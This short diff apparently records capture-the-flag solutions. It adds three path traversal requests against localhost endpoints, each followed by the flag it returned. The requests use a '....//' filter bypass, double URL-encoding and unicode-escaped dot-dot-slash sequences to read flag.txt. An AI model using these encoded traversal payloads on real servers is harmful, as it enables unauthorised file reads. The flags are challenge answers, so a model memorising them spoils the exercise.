@@ -1,1 +1,12 @@
 flag{security_e91e6348157868de9dd8b25c81aebfb9}
+
+
+http://localhost/captain-america?filename=....//flag.txt
+CTF{P4th_Tr4v3rs4l_M4st3r_2024}
+
+http://localhost/deadpool?filename=%252e%252e%252f%2566%256c%2561%2567%252e%2574%2578%2574
+CTF{P4th_Tr4v3rs4l_M4st3r_2024}
+
+
+http://localhost/goku?filename=%5cu002e%5cu002e%5cu002fflag.txt
+CTF{P4th_Tr4v3rs4l_M4st3r_2024}
